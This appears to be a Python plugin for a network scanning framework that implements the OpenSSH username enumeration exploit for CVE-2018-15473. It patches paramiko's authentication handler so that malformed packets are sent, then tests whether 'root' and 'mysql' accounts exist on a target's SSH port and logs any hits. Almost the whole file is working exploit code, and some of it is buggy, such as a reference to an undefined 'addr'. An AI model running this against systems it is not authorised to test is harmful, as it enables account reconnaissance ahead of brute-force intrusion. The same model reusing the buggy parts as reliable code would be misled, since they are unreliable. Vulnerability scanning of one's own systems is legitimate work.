#!/usr/bin/env python3 -W ignore::DeprecationWarning
# -*- coding: utf-8 -*-

"""
*----------------*
|CVE-2018-15473  |
*----------------*
Sources:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15473
https://security.netapp.com/advisory/ntap-20181101-0001/
https://www.exploit-db.com/exploits/45233
https://github.com/Rhynorater/CVE-2018-15473-Exploit

"""
import warnings
import paramiko
import socket
import logging as log
from .IPlugin import IPlugin, connection_type

log.getLogger("paramiko").setLevel(log.CRITICAL)
old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

class BadUsername(Exception):
	def __init__(self):
		pass

def add_boolean(*args, **kwargs):
    pass

def call_error(*args, **kwargs):
    raise BadUsername()

def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

def checkUsername(ip, username, tried=0):
	sock = socket.socket()
	sock.connect(ip)
	transport = paramiko.transport.Transport(sock)
	try:
	    transport.start_client()
	except paramiko.ssh_exception.SSHException:
	    transport.close()
	    if tried < 4:
	    	tried += 1
	    	return checkUsername(ip, username, tried)
	    else:
	    	log.info("plugin=openssh-15473 error=failed_to_connect")
	except Exception as e: log.error('OOPS {}:{} -> {}'.format(addr[0],addr[1], e))
	try:
		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
	except BadUsername:
    		return (username, False)
	except paramiko.ssh_exception.AuthenticationException:
    		return (username, True)
	except Exception as e: log.info("plugin=openssh-15473 error=???")
	return

paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
class Plugin(IPlugin):
	def __init__(self):
		super().__init__()
		self.port = 22
		self.connection_type = connection_type.RAW

	def config(self):
		pass

	def exec(self, socket):
		rip = socket.getpeername()
		res = checkUsername(rip, "root")
		if res[1]:
			log.info("plugin=openssh-15473 device={} username={} valid={}".format(socket.getpeername()[0], res[0], res[1]))
		res = checkUsername(rip, "mysql")
		if res[1]:
			log.info("plugin=openssh-15473 device={} username={} valid={}".format(socket.getpeername()[0], res[0], res[1]))
